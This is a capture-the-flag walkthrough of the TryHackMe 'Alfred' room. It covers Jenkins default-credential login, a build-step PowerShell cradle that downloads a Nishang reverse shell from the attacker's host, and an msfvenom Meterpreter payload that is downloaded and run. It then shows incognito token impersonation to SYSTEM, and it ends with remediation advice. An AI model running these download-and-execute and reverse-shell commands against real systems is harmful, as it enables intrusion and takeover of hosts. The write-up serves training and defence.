---
title: "TryHackMe: Alfred — Jenkins Groovy RCE & Windows Token Impersonation (SeImpersonatePrivilege)"
author: parthpandey
categories: [TryHackMe, Case-Studies]
tags: [windows, jenkins, groovy, nishang, powershell, seimpersonate, incognito, token-impersonation, meterpreter, privesc]
render_with_liquid: false
date: 2026-10-09 20:10:00 +0530
---

**Alfred** is a landmark Windows security case study focusing on two pervasive real-world threat vectors: **insecure continuous integration (CI) service deployments** and **Windows Access Token Manipulation via `SeImpersonatePrivilege`**.

This walkthrough analyzes how default administrative credentials on a Jenkins automation server permit arbitrary command execution via Groovy scripting, and details how a low-privileged service account (`alfred`) can be escalated to `NT AUTHORITY\SYSTEM` by abusing token impersonation primitives.

---

## Room Metadata

| Attribute | Specification |
|:---|:---|
| **Platform** | TryHackMe |
| **Room URL** | [tryhackme.com/room/alfred](https://tryhackme.com/room/alfred) |
| **Target OS** | Windows Server (x64) |
| **Difficulty** | Easy / Intermediate |
| **Primary Vectors** | Jenkins Default Auth (`admin:admin`), Jenkins Script Console / Build Step RCE, `SeImpersonatePrivilege` Token Theft |
| **Key Utilities** | `nmap`, Nishang (`Invoke-PowerShellTcp.ps1`), Meterpreter, `incognito` module |

---

## Attack Chain Diagram

```
[Phase 1: Ingress Discovery]
   │── Nmap Scan -> Port 80 (IIS website), Port 8080 (Jenkins Dashboard)
   └── Credential Validation -> admin:admin grants full access
         │
[Phase 2: Initial Remote Code Execution]
   │── Configure Jenkins Project Build Step:
   │     powershell iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/shell.ps1')
   └── Netcat Listener on Kali catches initial reverse shell as: alfred
         │
[Phase 3: Meterpreter Stage Upgrade]
   │── Generate x64 Meterpreter Payload with msfvenom
   │── Download & execute via PowerShell:
   │     Start-Process "shell.exe"
   └── Meterpreter session established
         │
[Phase 4: Token Impersonation Escalation]
   │── Privileges check: whoami /priv reveals:
   │     SeImpersonatePrivilege -> Enabled
   │── Load Incognito Module inside Meterpreter:
   │     load incognito
   │     list_tokens -u -> Delegation Token Available: NT AUTHORITY\SYSTEM
   │     impersonate_token "NT AUTHORITY\\SYSTEM"
   │── Process Migration to stable system service (spoolsv.exe)
   └── Complete System Takeover -> Root Flag Captured
```

---

## Phase 1: Service Enumeration

We initialize with an Nmap scan targeting TCP ports:

```console
$ nmap -sC -sV -p 80,8080 -oN alfred_scan.txt 10.10.155.88
```

```
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
|_http-title: Site doesn't have a title (text/html).
8080/tcp open  http-proxy Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site not found · GitHub
```

Navigating to `http://10.10.155.88:8080` displays a standard **Jenkins CI/CD login portal**.

Testing default industry credentials:
- **Username**: `admin`
- **Password**: `admin`

Authentication succeeds instantly, providing full administrative access over all jobs, build steps, and administrative settings.

---

## Phase 2: Remote Code Execution via Jenkins

Jenkins provides direct command execution capabilities through project configuration build steps or the Groovy Script Console (`/script`).

We leverage a Jenkins project build step:
1. Navigate to the existing project or create a new freestyle project.
2. Under the **Build** section, click **Add build step** -> **Execute Windows batch command**.

On our attacker system, we host Nishang's `Invoke-PowerShellTcp.ps1`:

```console
$ cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 ./shell.ps1
$ echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.30 -Port 4444' >> shell.ps1
$ python3 -m http.server 8000
```

Start a local Netcat listener:

```console
$ nc -lvnp 4444
```

In the Jenkins batch command box, insert the PowerShell web download cradle:

```cmd
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.30:8000/shell.ps1')
```

Click **Save** and trigger **Build Now**. Within seconds, our Netcat listener catches an interactive shell:

```console
connect to [10.10.14.30] from (UNKNOWN) [10.10.155.88] 49247
Windows PowerShell running as user alfred on ALFRED
PS C:\Program Files (x86)\Jenkins\workspace\project> whoami
alfred\alfred
PS C:\Users\alfred\Desktop> type user.txt
79007a...[REDACTED USER FLAG]
```

---

## Phase 3: Staging a Meterpreter Session

To exploit Windows token impersonation privileges reliably, we stage an x64 Meterpreter binary.

Generate the payload using `msfvenom`:

```console
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.30 LPORT=4445 -f exe -o meterpreter.exe
```

Set up the Metasploit multi-handler:

```console
$ msfconsole -q
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.30
msf6 exploit(multi/handler) > set LPORT 4445
msf6 exploit(multi/handler) > run -j
```

From our initial PowerShell reverse shell, retrieve and launch the executable:

```powershell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.30:8000/meterpreter.exe', 'C:\Users\alfred\Desktop\meterpreter.exe')"
Start-Process "C:\Users\alfred\Desktop\meterpreter.exe"
```

Meterpreter catches the incoming connection:

```console
[*] Sending stage (175686 bytes) to 10.10.155.88
[*] Meterpreter session 1 opened (10.10.14.30:4445 -> 10.10.155.88:49255)
meterpreter > getuid
Server username: alfred\alfred
```

---

## Phase 4: Token Impersonation (`SeImpersonatePrivilege`)

### 1. Identifying Privileges

Run `whoami /priv` inside the shell:

```console
meterpreter > shell
Process 2844 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]

C:\Users\alfred\Desktop>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile one process                       Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
```

Notice: **`SeImpersonatePrivilege` is ENABLED**.

### Why `SeImpersonatePrivilege` is Dangerous
This privilege permits a process to impersonate any security context for which it has an access token. If a service account can coerce an elevated account (such as `NT AUTHORITY\SYSTEM`) to authenticate to it (via Named Pipes, RPC, or DCOM), it can steal and impersonate that token to elevate privileges.

### 2. Loading Incognito & Stealing the SYSTEM Token

Inside Meterpreter:

```console
meterpreter > load incognito
Loading extension incognito...Success.

meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens may be available
Total tokens found: 3

Delegation Tokens Available
========================================
ALFRED\alfred
NT AUTHORITY\SYSTEM

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK SERVICE
```

An active delegation token for `NT AUTHORITY\SYSTEM` is available in memory. We execute:

```console
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### 3. Migrating to a Stable System Process

Even with the token impersonated, our thread can be reverted if the parent process terminates or resets. Best operational security dictates migrating into a native, permanent Windows system service like `services.exe` or `spoolsv.exe`.

```console
meterpreter > ps | grep spoolsv
 668   580  spoolsv.exe   x64   0   NT AUTHORITY\SYSTEM   C:\Windows\System32\spoolsv.exe

meterpreter > migrate 668
[*] Migrating from 2844 to 668...
[*] Migration completed successfully.

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

We now have full, untethered SYSTEM privileges:

```console
meterpreter > shell
C:\Windows\System32> cd C:\Windows\System32\config
C:\Windows\System32\config> type root.txt
dff0f7...[REDACTED ROOT FLAG]
```

---

## Defensive Remediation & Audit Controls

| Risk | Remediation Action |
|:---|:---|
| **Default CI/CD Credentials** | Change all default credentials immediately upon provisioning. Implement mandatory multi-factor authentication (MFA) or SSO (SAML/OIDC) integration on administrative interfaces. |
| **Exposed Management Ports** | Restrict port 8080 binding to `127.0.0.1` or internal VPN management subnets via host firewalls (Windows Defender Firewall) or network ACLs. |
| **`SeImpersonatePrivilege` Abuse** | Service accounts should only receive minimal required privileges. Windows Server administrators should remove `SeImpersonatePrivilege` from service accounts that do not strictly require named pipe impersonation. |
| **Endpoint Detection (EDR)** | Configure Sysmon Event ID 10 (ProcessAccess) and Event ID 1 (Process Creation) to alert on token impersonation tools (`incognito`, `PrintSpoofer`, `GodPotato`). |
